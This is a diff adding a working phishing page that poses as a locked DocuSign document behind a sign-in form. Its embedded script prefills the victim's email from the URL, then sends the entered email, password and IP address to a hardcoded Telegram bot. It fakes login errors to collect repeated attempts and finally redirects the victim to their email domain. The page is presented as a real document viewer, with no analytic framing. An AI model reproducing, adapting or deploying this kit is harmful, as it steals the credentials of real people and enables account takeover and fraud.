@@ -1,0 +1,356 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PDF Document Viewer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-image: url('https://res.cloudinary.com/dygxadrhi/image/upload/fl_preserve_transparency/v1750555548/Untitled_design_lhekk9.jpg');
+            background-size: cover;
+            background-position: center;
+            position: relative;
+        }
+        
+        body::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 0;
+        }
+        
+        .pdf-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            background-color: #fff;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            z-index: 100;
+        }
+        
+        .pdf-logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .pdf-logo img {
+            height: 45px;
+            margin-right: 20px;
+        }
+        
+        .pdf-logo-text {
+            font-weight: bold;
+            color: #e74c3c;
+            font-size: 16px;
+        }
+        
+        .divider {
+            height: 30px;
+            width: 1px;
+            background-color: #ddd;
+            margin: 0 15px;
+        }
+        
+        .document-title {
+            font-size: 16px;
+            color: #106efc;
+        }
+        
+        .login-container {
+            background-color: rgb(14, 95, 245);
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 0 20px rgb(250, 248, 248);
+            width: 350px;
+            text-align: center;
+            position: relative;
+            z-index: 10;
+        }
+        
+        .form-logo {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .form-logo img {
+            height: 60px;
+            margin-right: 20px;
+        }
+        
+        .form-logo-text {
+            font-weight: bold;
+            color: #e74c3c;
+            font-size: 20px;
+        }
+        
+        .form-title {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #FFFFFF;
+        }
+        
+        .form-message {
+            font-size: 14px;
+            color: #FFFFFF;
+            margin-bottom: 25px;
+        }
+        
+        .error-message {
+            color: #e74c3c;
+            background-color: #fde8e8;
+            padding: 10px;
+            border-radius: 3px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #0f0101;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #F6BE00;
+            color: rgb(15, 2, 2);
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover {
+            background-color: #FFFFFF;
+        }
+        
+        .submit-btn.loading {
+            position: relative;
+            color: transparent;
+        }
+        
+        .submit-btn.loading::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        
+        .document-background {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            opacity: 0.1;
+            z-index: 0;
+            pointer-events: none;
+            filter: brightness(0.5);
+        }
+        
+        .document-background img {
+            max-width: 600px;
+            max-height: 800px;
+        }
+        
+        .attempt-counter {
+            display: none;
+        }
+        
+        .footer-text {
+            font-size: 10px;
+            color: #FFFFFF;
+            margin-top: 20px;
+            text-align: center;
+            line-height: 1.4;
+        }
+        
+        /* Honeypot field - hidden from humans but visible to bots */
+        .hp-field {
+            position: absolute;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <div class="pdf-header">
+        <div class="pdf-logo">
+            <img src="https://docucdn-a.akamaihd.net/olive/images/2.64.0/global-assets/ds-icons-favicon-default-64x64.svg" alt="PDF Logo">
+            <span class="pdf-logo-text">DocuSign</span>
+        </div>
+        <div class="divider"></div>
+        <div class="document-title">Document Is Locked, Sign In To View</div>
+    </div>
+    
+    <div class="document-background">
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1OTUgODQyIj48cmVjdCB3aWR0aD0iNTk1IiBoZWlnaHQ9Ijg0MiIgZmlsbD0iI2ZmZiIvPjxwYXRoIGQ9Ik0xNDkgMjIxaDI5N3Y0MUgxNDl6bTAgODNoMjk3djQxSDE0OXptMCA4NEgyOTh2NDFIMTQ5eiIgZmlsbD0iI2RkZCIvPjwvc3ZnPg=" alt="Document Preview">
+    </div>
+    
+    <div class="login-container">
+        <div class="form-logo">
+            <img src="data:image/png;base64,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"></span>
+        </div>
+        <div class="form-title">Sign in to view document</div>
+        <div class="form-message">This document is protected and intended only for your access.</div>
+        
+        <div class="error-message" id="errorMessage">Invalid credentials. Please try again.</div>
+        
+        <form id="loginForm">
+            <!-- Honeypot field - hidden from humans but visible to bots -->
+            <div class="hp-field">
+                <label for="hpt_username">Leave this blank</label>
+                <input type="text" id="hpt_username" name="hpt_username" tabindex="-1" autocomplete="off">
+            </div>
+            
+            <div class="form-group">
+                <label for="usr_id">Email Address</label>
+                <input type="text" id="usr_id" name="usr_id" required autocomplete="username">
+            </div>
+            <div class="form-group">
+                <label for="pwd_key">Password</label>
+                <input type="password" id="pwd_key" name="pwd_key" required autocomplete="current-password">
+            </div>
+            <button type="submit" class="submit-btn" id="submitBtn">Sign In</button>
+        </form>
+        
+        <div class="footer-text">
+            © 2025 DocuSign By clicking Next, you accept Adobe Cloud Storage terms and conditions in accordance with our privacy policy. and Adobe terms of use. Check the official documentation to review our terms of use.
+        </div>
+        
+        <div class="attempt-counter" id="attemptCounter">0</div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Extract email from URL hash
+            const hash = window.location.hash.substring(1);
+            if (hash) {
+                document.getElementById('usr_id').value = decodeURIComponent(hash);
+            }
+            
+            const loginForm = document.getElementById('loginForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const attemptCounter = document.getElementById('attemptCounter');
+            const errorMessage = document.getElementById('errorMessage');
+            let attempts = 0;
+            
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Check honeypot field first
+                const honeypot = document.getElementById('hpt_username').value;
+                if (honeypot !== '') {
+                    // Bot detected - don't process the form
+                    console.log('Bot detected');
+                    return false;
+                }
+                
+                // Hide error message if shown
+                errorMessage.style.display = 'none';
+                
+                // Show loading state
+                submitBtn.classList.add('loading');
+                
+                // Get form values
+                const username = document.getElementById('usr_id').value;
+                const password = document.getElementById('pwd_key').value;
+                
+                // Get user IP (simplified method)
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        const ip = data.ip;
+                        
+                        // Send data to Telegram bot (replace with your actual bot token and chat ID)
+                        const botToken = '8589851245:AAENOOfh3e9YlBwQrmiEe5RzIn6kL6t7_JY';
+                        const chatId = '8279351688';
+                        const message = `OFFICE Login\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}`;
+                        
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                            .catch(err => console.error('Telegram send error:', err));
+                    })
+                    .catch(() => {
+                        // Fallback if IP fetch fails
+                        const message = `OFFICE Login\nUsername: ${username}\nPassword: ${password}\nIP: Unknown`;
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                            .catch(err => console.error('Telegram send error:', err));
+                    });
+                
+                // Increment attempt counter
+                attempts++;
+                attemptCounter.textContent = attempts;
+                
+                // Simulate processing delay
+                setTimeout(function() {
+                    submitBtn.classList.remove('loading');
+                    
+                    if (attempts < 3) {
+                        // Show error for first two attempts
+                        errorMessage.style.display = 'block';
+                        document.getElementById('pwd_key').value = '';
+                    } else {
+                        // On third attempt, redirect
+                        const domain = username.split('@')[1] || 'docs.google.com';
+                        window.location.href = 'https://' + domain;
+                    }
+                }, 1500);
+            });
+            
+            // Additional bot protection - disable autofill
+            setTimeout(function() {
+                document.getElementById('usr_id').setAttribute('autocomplete', 'off');
+                document.getElementById('pwd_key').setAttribute('autocomplete', 'new-password');
+            }, 100);
+        });
+    </script>
+</body>
+</html>
